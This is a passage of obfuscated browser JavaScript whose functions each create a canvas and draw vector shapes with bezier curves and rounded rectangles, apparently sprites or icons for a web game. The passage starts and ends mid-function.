			Δ.bezierCurveTo(ⵠⵠΔⵠᐃ * ᐃ, ᐃ * 74, ᐃ * 14, ᐃ * 78, ᐃⲆⵠᐃⵠ * ᐃ, 83 * ᐃ);
			Δ.bezierCurveTo(ᐃⲆⲆΔⵠ * ᐃ, 65 * ᐃ, ⵠⲆⲆⲆᐃ * ᐃ, ᐃ * 54, ᐃ * ΔΔᐃᐃΔ, ᐃ * 42);
			Δ.bezierCurveTo(ᐃ * 14, 39 * ᐃ, 14 * ᐃ, ᐃ * 39, ᐃ * 12, 36 * ᐃ);
			Δ.bezierCurveTo(ᐃ * ᐃⲆⲆΔΔⵠΔ, ᐃ * 33, 16 * ᐃ, 33 * ᐃ, ᐃ * 19, ᐃ * 30);
			Δ.bezierCurveTo(18 * ᐃ, 27 * ᐃ, ᐃ * 18, ᐃ * 27, ᐃ * ⵠᐃᐃΔᐃ, ᐃ * 25);
			Δ.bezierCurveTo(24 * ᐃ, ᐃ * 24, ᐃ * 31, ᐃ * 21, ᐃ * 29, ᐃ * ᐃΔⲆΔⵠ);
			Δ.bezierCurveTo(37 * ᐃ, 25 * ᐃ, ᐃ * 37, ᐃ * 25, ᐃ * 45, 31 * ᐃ);
			Δ.bezierCurveTo(40 * ᐃ, 23 * ᐃ, ᐃ * 40, 21 * ᐃ, ᐃ * 42, 16 * ᐃ);
			Δ.bezierCurveTo(74 * ᐃ, ⵠᐃⲆᐃᐃΔⵠ * ᐃ, 74 * ᐃ, ᐃ * 16, 106 * ᐃ, 16 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 113, 21 * ᐃ, ᐃ * 113, 21 * ᐃ, 119 * ᐃ, ᐃ * 26);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠ], Ⲇᐃ[0], ⵠᐃΔΔ * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 97.49996948242188, ᐃ * 95.12844848632812);
			Ⲇᐃᐃ(Δ, -62.5 * ᐃ, -41.5 * ᐃ, ᐃ * 125, ᐃ * 83, 20 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ⵠⲆᐃⵠ], ᐃ * 4);
			return Ⲇⵠ
		}

		function ΔⵠᐃΔⲆⲆΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 248;
			Ⲇⵠ.height = ᐃ * 247;
			Δ.save();
			Δ.translate(182 * ᐃ, 120 * ᐃ);
			Ⲇᐃᐃ(Δ, -ⵠⵠⵠΔᐃ * ᐃ, -67 * ᐃ, ᐃ * ⲆⲆⲆΔΔ, 134 * ᐃ, ᐃ * ΔⲆⵠ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.save();
			Δ.translate(ᐃ * 68.5, 127.5 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -8.5, -70.5 * ᐃ, ᐃ * 17, ᐃ * 141, ᐃ * ⵠᐃⵠΔ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠⵠ]);
			Δ.save();
			Δ.translate(ᐃ * 123.5, 68 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -82.5, -24 * ᐃ, ᐃ * 165, ᐃ * 48, ᐃ * 4);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆᐃ], Ⲇᐃ[1], ᐃ * 6);
			Δ.save();
			Δ.translate(123 * ᐃ, ᐃ * 179.5);
			Ⲇᐃᐃ(Δ, -83 * ᐃ, ᐃ * -24.5, 166 * ᐃ, 49 * ᐃ, 4 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆΔⲆ], Ⲇᐃ[ΔΔΔ], ᐃⵠⵠⲆⵠ * ᐃ);
			Δ.save();
			Δ.translate(123.5 * ᐃ, 123.5 * ᐃ);
			Δ.rotate(6.24);
			Ⲇᐃᐃ(Δ, ᐃ * -82.5, ᐃ * -24.5, 165 * ᐃ, ᐃ * 49, ⲆⵠᐃΔ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[1], 6 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(204 * ᐃ, ᐃ * 112);
			Δ.bezierCurveTo(149 * ᐃ, 121.5 * ᐃ, ᐃ * 96, ᐃ * 130, 94 * ᐃ, ᐃ * 131);
			Δ.bezierCurveTo(ᐃ * 149.5, 127.5 * ᐃ, ᐃ * 149.5, ᐃ * 127.5, 205 * ᐃ, ᐃ * 124);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠΔⵠ]);
			return Ⲇⵠ
		}

		function ⵠΔᐃⲆᐃ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = ᐃ * 40;
			var ⵠⵠᐃ = ᐃ * 40;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			var Δⵠ = ᐃ * ᐃⵠⵠ / ΔⵠⵠΔ;
			var ⲆⵠⲆ = ⵠⵠᐃ * ᐃ / 2;
			var ⲆⲆⵠ = ᐃ * 15;
			Δ.save();
			Δ.translate(Δⵠ, ⲆⵠⲆ);
			Δ.globalAlpha = 1;
			ⵠᐃᐃ(Δ, ᐃⵠⲆ, 0, ⲆⲆⵠ);
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			var ⲆⲆⵠ = ᐃᐃⲆᐃ * ᐃ;
			var Δⵠ = 2 * ᐃ;
			var ⲆⵠⲆ = ᐃ * 1;
			Δ.translate(Δⵠ, ⲆⵠⲆ);
			Δ.globalAlpha = 1;
			ⵠᐃᐃ(Δ, 0, ΔⲆⵠⲆ, ⲆⲆⵠ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠΔ]);
			Δ.restore();
			return Ⲇⵠ
		}

		function ⲆⲆⲆⵠᐃΔΔⵠⵠ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 185 * ᐃ;
			Ⲇⵠ.height = ᐃ * 240;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 58, ᐃ * 205);
			Δ.bezierCurveTo(74 * ᐃ, 227 * ᐃ, ᐃ * 83, 230 * ᐃ, 92 * ᐃ, ᐃ * 230);
			Δ.bezierCurveTo(ᐃ * 101, ᐃ * 232, ᐃ * 119, ᐃ * 219, 122 * ᐃ, ᐃ * 205);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃⵠ], Ⲇᐃ[2], Ⲇᐃⵠᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(46 * ᐃ, 151 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 34, ᐃ * 126, ᐃ * 21, ᐃ * 130, ᐃ * 10, ᐃ * 139);
			Δ.bezierCurveTo(27 * ᐃ, ᐃ * 168, 48 * ᐃ, ᐃ * 180, ᐃ * 53, ᐃ * 184);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃⵠ], Ⲇᐃ[ΔⲆΔΔΔ], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(ᐃ * 122, ᐃ * 165);
			Δ.bezierCurveTo(143 * ᐃ, ᐃ * 140, 154 * ᐃ, ᐃ * 123, 172 * ᐃ, ᐃ * 139);
			Δ.bezierCurveTo(169 * ᐃ, ᐃ * 149, 147 * ᐃ, ᐃ * 173, 126 * ᐃ, 192 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[2], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(47 * ᐃ, 129 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 55, ᐃ * 90, 71 * ᐃ, 66 * ᐃ, ᐃ * 93, ᐃ * 69);
			Δ.bezierCurveTo(116 * ᐃ, ᐃ * 70, 122 * ᐃ, 88 * ᐃ, ᐃ * 136, ᐃ * 127);
			Δ.bezierCurveTo(143 * ᐃ, ᐃ * 137, 144 * ᐃ, ᐃ * 137, ᐃ * 144, ᐃ * 142);
			Δ.bezierCurveTo(138 * ᐃ, ᐃ * 199, ᐃ * 128, ᐃ * 206, 108 * ᐃ, 219 * ᐃ);
			Δ.bezierCurveTo(84 * ᐃ, 228 * ᐃ, 65 * ᐃ, ᐃ * 224, 50 * ᐃ, 191 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 41, 161 * ᐃ, ᐃ * 41, ᐃ * 157, 39 * ᐃ, 144 * ᐃ);
			Δ.bezierCurveTo(40 * ᐃ, 140 * ᐃ, 42 * ᐃ, 137 * ᐃ, 47 * ᐃ, 129 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔᐃⲆ], Ⲇᐃ[2], ᐃ * Ⲇⵠⵠⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(47 * ᐃ, ᐃ * 133);
			Δ.bezierCurveTo(65 * ᐃ, ᐃ * 143, 74 * ᐃ, ᐃ * 162, 70 * ᐃ, ᐃ * 186);
			Δ.bezierCurveTo(71 * ᐃ, ᐃ * 188.5, ᐃ * 71, ᐃ * 188.5, ᐃ * 72, 191 * ᐃ);
			Δ.bezierCurveTo(81 * ᐃ, ᐃ * 185.5, ᐃ * 81, 185.5 * ᐃ, ᐃ * 90, ᐃ * 180);
			Δ.bezierCurveTo(99 * ᐃ, ᐃ * 185, ᐃ * 99, ᐃ * 185, ᐃ * 108, ᐃ * 190);
			Δ.bezierCurveTo(ᐃ * 110.5, 184.5 * ᐃ, ᐃ * 110.5, 184.5 * ᐃ, ᐃ * 113, 179 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 110, 156 * ᐃ, ᐃ * 121, 156 * ᐃ, 142 * ᐃ, 141 * ᐃ);
			Δ.bezierCurveTo(137.5 * ᐃ, 133 * ᐃ, 137.5 * ᐃ, 133 * ᐃ, ᐃ * 133, 125 * ᐃ);
			Δ.bezierCurveTo(116 * ᐃ, ᐃ * 78, 112 * ᐃ, ᐃ * 70, ᐃ * 91, ᐃ * 71);
			Δ.bezierCurveTo(ᐃ * 62, 69 * ᐃ, ᐃ * 59, ᐃ * 107, ᐃ * 48, 132 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 93, 86 * ᐃ);
			Δ.bezierCurveTo(101 * ᐃ, 79 * ᐃ, ᐃ * 99, 56 * ᐃ, ᐃ * ᐃᐃⲆⲆⲆⲆⲆ, 37 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 90, ᐃ * 34, 90 * ᐃ, 27 * ᐃ, 93 * ᐃ, ᐃ * ⵠΔΔⵠⲆ);
			Δ.bezierCurveTo(ᐃ * 96, ᐃ * ΔⲆⲆ, ᐃ * 85, ᐃ * 13, 82 * ᐃ, ᐃ * 26);
			Δ.bezierCurveTo(78 * ᐃ, ᐃ * 43, ᐃ * 89, 74 * ᐃ, ᐃ * 93, ᐃ * 85);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠⲆ], Ⲇᐃ[ΔⵠⵠΔ], ᐃ * ⵠᐃᐃⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(94 * ᐃ, 86 * ᐃ);
			Δ.bezierCurveTo(120 * ᐃ, ᐃ * 88, 132 * ᐃ, ᐃ * 109, ᐃ * 122, 128 * ᐃ);
			Δ.bezierCurveTo(118 * ᐃ, ᐃ * 139, 101 * ᐃ, 146 * ᐃ, ᐃ * 90, ᐃ * 143);
			Δ.bezierCurveTo(57 * ᐃ, ᐃ * 141, ᐃ * 49, ᐃ * 109, 68 * ᐃ, ᐃ * 94);
			Δ.bezierCurveTo(ᐃ * 78, 85 * ᐃ, ᐃ * 90, ᐃ * 86, 95 * ᐃ, ᐃ * 86);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(91 * ᐃ, 178 * ᐃ);
			Δ.bezierCurveTo(78 * ᐃ, 136 * ᐃ, 81 * ᐃ, ᐃ * 88, 93 * ᐃ, 87 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 101, 84 * ᐃ, ᐃ * 94, 97 * ᐃ, ᐃ * 94, 107 * ᐃ);
			Δ.bezierCurveTo(91 * ᐃ, 112 * ᐃ, ᐃ * 92, 117 * ᐃ, 94 * ᐃ, 121 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 98, 126 * ᐃ, 102 * ᐃ, ᐃ * 128, ᐃ * 97, 135 * ᐃ);
			Δ.bezierCurveTo(92 * ᐃ, ᐃ * 140, ᐃ * 93, 160 * ᐃ, 91 * ᐃ, 179 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔΔ], Ⲇᐃ[ⲆⵠⲆⲆ], ᐃ * Ⲇᐃⵠᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * ⵠᐃΔᐃᐃ, ᐃ * 151);
			Δ.bezierCurveTo(22 * ᐃ, ᐃ * 147, 22 * ᐃ, ᐃ * 147, ᐃ * 24, 143 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 27, 144.5 * ᐃ, 27 * ᐃ, ᐃ * 144.5, ᐃ * 30, 146 * ᐃ);
			Δ.bezierCurveTo(31 * ᐃ, ᐃ * 143, 31 * ᐃ, ᐃ * 143, ᐃ * 32, ᐃ * 140);
			Δ.bezierCurveTo(35 * ᐃ, ᐃ * 140.5, ᐃ * 35, ᐃ * 140.5, 38 * ᐃ, ᐃ * 141);
			Δ.bezierCurveTo(ᐃ * 31, 132 * ᐃ, 29 * ᐃ, 131 * ᐃ, 22 * ᐃ, ᐃ * 132);
			Δ.bezierCurveTo(ⲆᐃⵠⲆⵠᐃⵠ * ᐃ, 135 * ᐃ, 13 * ᐃ, ᐃ * 135, Ⲇᐃᐃᐃᐃ * ᐃ, 138 * ᐃ);
			Δ.bezierCurveTo(15.5 * ᐃ, ᐃ * 144.5, ᐃ * 15.5, ᐃ * 144.5, ⵠΔΔⲆᐃ * ᐃ, ᐃ * 151);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6]);
			ⵠᐃᐃ(Δ, ᐃ * 61, ᐃ * 183, 16.15549442140351 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[7]);
			ⵠᐃᐃ(Δ, ᐃ * 121, ᐃ * 184, 14.866068747318506 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⵠᐃᐃ]);
			ⵠᐃᐃ(Δ, 57 * ᐃ, 178 * ᐃ, 5.656854249492381 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[Δᐃⵠⵠ]);
			ⵠᐃᐃ(Δ, 116 * ᐃ, ᐃ * 177, 5.830951894845301 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[2]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 162, 152 * ᐃ);
			Δ.bezierCurveTo(161.5 * ᐃ, 148 * ᐃ, ᐃ * 161.5, 148 * ᐃ, 161 * ᐃ, ᐃ * 144);
			Δ.bezierCurveTo(ᐃ * 157.5, 145 * ᐃ, 157.5 * ᐃ, 145 * ᐃ, 154 * ᐃ, ᐃ * 146);
			Δ.bezierCurveTo(153.5 * ᐃ, 143 * ᐃ, ᐃ * 153.5, ᐃ * 143, 153 * ᐃ, ᐃ * 140);
			Δ.bezierCurveTo(149 * ᐃ, ᐃ * 140.5, ᐃ * 149, ᐃ * 140.5, ᐃ * 145, 141 * ᐃ);
			Δ.bezierCurveTo(150 * ᐃ, ᐃ * 132, 161 * ᐃ, 131 * ᐃ, 170 * ᐃ, 138 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 173, ᐃ * 141, ᐃ * 165, ᐃ * 150, 162 * ᐃ, 150 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ᐃ * 106, 110 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 104, 98 * ᐃ, 112 * ᐃ, ᐃ * 91, ᐃ * 118, ᐃ * 101);
			Δ.bezierCurveTo(ᐃ * 122, ᐃ * 115, ᐃ * 121, ᐃ * 119, 117 * ᐃ, ᐃ * 124);
			Δ.bezierCurveTo(ᐃ * 112, ᐃ * 129, ᐃ * 107, 124 * ᐃ, ᐃ * 106, 112 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(ᐃ * 64, 106 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 66, ᐃ * 97, 72 * ᐃ, 89 * ᐃ, ᐃ * 76, ᐃ * 98);
			Δ.bezierCurveTo(ᐃ * 78, 106 * ᐃ, 79 * ᐃ, 118 * ᐃ, 72 * ᐃ, ᐃ * 126);
			Δ.bezierCurveTo(ᐃ * 65, ᐃ * 130, 63 * ᐃ, ᐃ * 117, ᐃ * 64, 108 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1]);
			return Ⲇⵠ
		}

		function ᐃΔⲆᐃΔⵠᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 248 * ᐃ;
			Ⲇⵠ.height = ᐃ * 247;
			Δ.save();
			Δ.translate(69.5 * ᐃ, 145 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -8.5, ᐃ * -63, ᐃ * 17, ᐃ * 127, ᐃ * 1);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.save();
			Δ.translate(183 * ᐃ, 145 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -8, -63 * ᐃ, ᐃ * 16, 126 * ᐃ, 1 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔ]);
			Δ.save();
			Δ.translate(123.5 * ᐃ, ᐃ * 62.5);
			Δ.rotate(6.28);
			Ⲇᐃᐃ(Δ, -84.5 * ᐃ, ᐃ * -25.5, 169 * ᐃ, 51 * ᐃ, ᐃ * 5);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⵠⲆ], Ⲇᐃ[1], ᐃ * 6);
			Δ.save();
			Δ.translate(ᐃ * 123.5, ᐃ * 118);
			Δ.rotate(6.24);
			Ⲇᐃᐃ(Δ, -85.5 * ᐃ, -24 * ᐃ, 169 * ᐃ, ᐃ * 48, 5 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[1], ᐃ * ⵠᐃΔⵠᐃ);
			Δ.save();
			Δ.translate(ᐃ * 122, 177.5 * ᐃ);
			Δ.rotate(6.32);
			Ⲇᐃᐃ(Δ, ᐃ * -84, -23.5 * ᐃ, ᐃ * 169, ᐃ * 47, ᐃ * ⵠⲆⵠⵠ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[Ⲇᐃⵠ], 6 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(ᐃ * 37, 157 * ᐃ);
			Δ.bezierCurveTo(49 * ᐃ, ᐃ * 160, ᐃ * 49, ᐃ * 160, ᐃ * 61, 163 * ᐃ);
			Δ.bezierCurveTo(49.5 * ᐃ, 165.5 * ᐃ, ᐃ * 49.5, 165.5 * ᐃ, ᐃ * 38, 168 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 205, 175 * ᐃ);
			Δ.bezierCurveTo(192.5 * ᐃ, ᐃ * 180, ᐃ * 192.5, 180 * ᐃ, 180 * ᐃ, 185 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 193, 188 * ᐃ, ᐃ * 193, 188 * ᐃ, 206 * ᐃ, 191 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆ]);
			return Ⲇⵠ
		}

		function ⵠⵠⵠᐃⲆⲆᐃ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 185 * ᐃ;
			Ⲇⵠ.height = 240 * ᐃ;
			Δ.globalAlpha = .5;
			Δ.translate(0, ᐃ * ⲆΔΔᐃᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(ᐃ * 44, 137 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 60, ᐃ * 87, 68 * ᐃ, 66 * ᐃ, ᐃ * 92, ᐃ * 67);
			Δ.bezierCurveTo(115 * ᐃ, 64 * ᐃ, ᐃ * 129, 97 * ᐃ, 137 * ᐃ, ᐃ * 136);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 53, 181 * ᐃ);
			Δ.bezierCurveTo(30 * ᐃ, ᐃ * 164, 19 * ᐃ, ᐃ * 150, ᐃ * ⲆⵠΔΔⲆⲆⵠ, ᐃ * 136);
			Δ.bezierCurveTo(ᐃ * 28, ᐃ * 121, ᐃ * 38, ᐃ * 132, 48 * ᐃ, 150 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 63, ᐃ * 208);
			Δ.bezierCurveTo(ᐃ * 75, 224 * ᐃ, 86 * ᐃ, ᐃ * 228, 93 * ᐃ, ᐃ * 228);
			Δ.bezierCurveTo(ᐃ * 104, ᐃ * 229, ᐃ * 116, 219 * ᐃ, ᐃ * 122, 205 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(130 * ᐃ, ᐃ * 170);
			Δ.bezierCurveTo(146 * ᐃ, 125 * ᐃ, ᐃ * 156, ᐃ * 126, ᐃ * 173, 137 * ᐃ);
			Δ.bezierCurveTo(167 * ᐃ, ᐃ * 151, 143 * ᐃ, 174 * ᐃ, 131 * ᐃ, 183 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(39 * ᐃ, 140 * ᐃ);
			Δ.bezierCurveTo(75 * ᐃ, 126 * ᐃ, ᐃ * 113, ᐃ * 127, ᐃ * 143, ᐃ * 137);
			Δ.bezierCurveTo(141 * ᐃ, ᐃ * 186, 130 * ᐃ, ᐃ * 202, 113 * ᐃ, ᐃ * 214);
			Δ.bezierCurveTo(ᐃ * 85, 228 * ᐃ, 56 * ᐃ, 219 * ᐃ, 48 * ᐃ, 173 * ᐃ);
			Δ.bezierCurveTo(40 * ᐃ, 148 * ᐃ, ᐃ * 43, 145 * ᐃ, ᐃ * 39, 140 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ΔΔᐃⵠ;
			Δ.translate(0, ᐃ * -10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(44 * ᐃ, ᐃ * 137);
			Δ.bezierCurveTo(60 * ᐃ, ᐃ * 87, 68 * ᐃ, 66 * ᐃ, 92 * ᐃ, 67 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 115, 64 * ᐃ, ᐃ * 129, ᐃ * 97, ᐃ * 137, 136 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆ], Ⲇᐃ[ⲆⵠΔΔ], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 53, ᐃ * 181);
			Δ.bezierCurveTo(30 * ᐃ, 164 * ᐃ, ᐃ * 19, 150 * ᐃ, 11 * ᐃ, 136 * ᐃ);
			Δ.bezierCurveTo(28 * ᐃ, ᐃ * 121, 38 * ᐃ, ᐃ * 132, 48 * ᐃ, 150 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 63, 208 * ᐃ);
			Δ.bezierCurveTo(75 * ᐃ, 224 * ᐃ, ᐃ * 86, ᐃ * 228, 93 * ᐃ, 228 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 104, ᐃ * 229, 116 * ᐃ, ᐃ * 219, 122 * ᐃ, 205 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠΔ], Ⲇᐃ[2], ⵠΔᐃΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(130 * ᐃ, ᐃ * 170);
			Δ.bezierCurveTo(146 * ᐃ, ᐃ * 125, 156 * ᐃ, ᐃ * 126, 173 * ᐃ, ᐃ * 137);
			Δ.bezierCurveTo(167 * ᐃ, ᐃ * 151, 143 * ᐃ, 174 * ᐃ, 131 * ᐃ, 183 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠΔⵠ], Ⲇᐃ[ⲆᐃᐃⲆ], ᐃ * ⲆⲆⲆΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(39 * ᐃ, 140 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 75, 126 * ᐃ, ᐃ * 113, ᐃ * 127, ᐃ * 143, 137 * ᐃ);
			Δ.bezierCurveTo(141 * ᐃ, ᐃ * 186, ᐃ * 130, 202 * ᐃ, ᐃ * 113, 214 * ᐃ);
			Δ.bezierCurveTo(85 * ᐃ, 228 * ᐃ, ᐃ * 56, 219 * ᐃ, 48 * ᐃ, ᐃ * 173);
			Δ.bezierCurveTo(40 * ᐃ, 148 * ᐃ, ᐃ * 43, 145 * ᐃ, 39 * ᐃ, ᐃ * 140);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆ], Ⲇᐃ[Ⲇⵠⵠᐃ], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ᐃ * 59, 99 * ᐃ);
			Δ.bezierCurveTo(71 * ᐃ, ᐃ * 68, ᐃ * 81, ᐃ * 68, ᐃ * 94, ᐃ * 67);
